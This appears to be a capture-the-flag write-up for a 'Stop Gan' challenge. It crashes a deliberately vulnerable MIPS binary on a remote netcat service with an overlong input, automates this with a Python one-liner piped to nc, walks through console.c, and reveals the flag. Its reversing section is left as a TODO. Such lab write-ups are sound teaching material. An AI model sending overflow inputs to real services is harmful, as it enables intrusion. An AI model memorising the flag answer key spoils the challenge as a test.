# Stop Gan
## Given Files
We were given a executable and a source file and a netcat adress and port to connect to.  
We seem to have the sourcce code and the compiled binary but we are only able to get the flag when we are running on the remote server.
```
buffer-overflow.ctfcompetition.com 1337
```
## Check the binary and remote
If we run a netcat command that connects to the website, it will give us two optoins.
```
Console commands:
run
quit
>>
```
if we select the run we get to input more arguments. After inputting **A** we get  message saying
```
Cauliflower systems never crash
```
We could get a hint here that this program is wanting us to do some buffer overflow.

## Buffer Overflow
To overflow the buffer, after selecting the **Run** function in the program, it prompted me to input. I then inputed a long stringand there I successfully overflowed the buffer and got the flag.
```bash
Console commands:
run
quit
>>run
Inputs: run
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
CTF{Why_does_cauliflower_threaten_us}
Cauliflower systems never crash >>
segfault detected! ***CRASH***
Console commands:
run
quit
>>
```
Of course we could use some python and bash to automate the process
```bash
python -c "print('run');print('a'*1024)" | nc buffer-overflow.ctfcompetition.com 1337| grep CTF

Output:
  CTF{Why_does_cauliflower_threaten_us}
```

## Explore Code
Not only do we want to get the flag, we want the understand the **bof** binary. To do that we will look at the **console.c** file and see where it calls the bof. Then we will reverse engineer the binary and see what we get.
### Examine the Source File
Heres the sources coe we could download and it writtin in C. By checking undersanding each function, we could get a handle of how we could overflow the buffer.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/**
 * 6e: bufferflow triggering segfault  - binary, compile with:
 * gcc /tmp/console.c -o /tmp/console -static -s
 *
 * Console allows the player to get info on the binary.
 * Crashing bof will trigger the 1st flag.
 * Controlling the buffer overflow in bof will trigger the 2nd flag.
 */

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  char inputs[256];
  printf("Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.\n Bonus flag for controlling the crash.\n");
  while(1) {
    printf("\nConsole commands: \nrun\nquit\n>>");
    if (fgets(inputs, 256, stdin) == NULL) {
      exit(0);
    }
    printf("Inputs: %s", inputs);
    if ( strncmp(inputs, "run\n\0", 256) == 0 ) {
      int result = system("/usr/bin/qemu-mipsel-static ./bof");
      continue;
    } else if ( strncmp(inputs, "quit\n\0", 256) == 0 ) {
      exit(0);
    } else {
      puts("Unable to determine action from your input");
      exit(0);
    }
  }
  return 0;
}

```
First when we enter the system, it goes into a infinite while loop
```
while(1) {

```
Then it checks for our input
```c
printf("\nConsole commands: \nrun\nquit\n>>");
if (fgets(inputs, 256, stdin) == NULL) {
  exit(0);
}
```
the **fgets** function here is used like this
```c
 char *fgets(char *str, int n, FILE *stream)
```
It reads a line from the specified stream and stores it into the string pointed to by str.The function will stop whenever it hits (n-1) characters, new line or end of file.
Here it's checking for the return value of NULL, this will only happen if our input stream is not found whithin the file.  
Then we have the function **strncmp**
```c
int strncmp(const char *str1, const char *str2, size_t n)
```
In it's essence, it compares the firs n char's of the str1 and str2, the ruturn value will be <0 for str1<str2, >0 for str2<str2, 0 for str1=str2.
This is when we select the run command. Then we call the ./bof file and there we execute the buffer overflow.
### Reversing **BOF**
We pull up **Ghidra**  
**TODO**
## Flag 
```
CTF{Why_does_cauliflower_threaten_us}
```
